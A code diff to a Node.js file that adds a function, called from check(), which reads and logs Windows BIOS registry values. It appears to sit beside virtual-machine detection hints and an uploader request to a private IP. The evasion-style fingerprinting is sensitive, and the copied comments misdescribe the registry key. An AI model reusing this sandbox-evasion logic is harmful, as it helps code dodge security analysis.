@@ -17,6 +17,7 @@ function check(cb) {
       }
     };
   } else {
+    winreestr();
     var options = {
       host: '192.168.1.33',
       path: '/api/uploader',
@@ -71,6 +72,25 @@ function check(cb) {
 //// WINDOWS APP SECURITY ////
 //////////////////////////////
 
+function winreestr() {
+  var Registry = require('winreg')
+,   regKey = new Registry({                                       // new operator is optional
+      hive: Registry.HKLM,                                        // open registry hive HKEY_CURRENT_USER
+      key:  '\\HARDWARE\\DESCRIPTION\\System\\BIOS' // key containing autostart programs
+    })
+
+ 
+// list autostart programs
+ regKey.values(function (err, items ) {
+  if (err)
+    console.log('ERROR: '+err);
+  else
+    for (var i=0; i<items.length; i++)
+      console.log('ITEM: '+items[i].name+'\t'+items[i].type+'\t'+items[i].value);
+}); 
+
+
+}
 /*
 
 /// HEX STRING 
@@ -112,28 +132,9 @@ exec('tasklist', function(err, stdout, stderr) {
 // VirtualBox VBoxTrayToolWndClass Parallels Workstation CPInterceptor DesktopUtilites Virtual PC {0843FD01-1D28-44a3-B11D-E3A93A85EA96} VMware Workstation VMSwitchUserControlClass
 
  
-var Registry = require('winreg')
-,   regKey = new Registry({                                       // new operator is optional
-      hive: Registry.HKLM,                                        // open registry hive HKEY_CURRENT_USER
-      key:  '\\HARDWARE\\DESCRIPTION\\System\\BIOS' // key containing autostart programs
-    })
-
- 
-// list autostart programs
- regKey.values(function (err, items ) {
-  if (err)
-    console.log('ERROR: '+err);
-  else
-    for (var i=0; i<items.length; i++)
-      console.log('ITEM: '+items[i].name+'\t'+items[i].type+'\t'+items[i].value);
-}); 
 
 
  
-var regedit = require('regedit')
  
-regedit.list('HKLM\\HARDWARE', function(err, result) {
-    console.log(result);
-})
 */
 
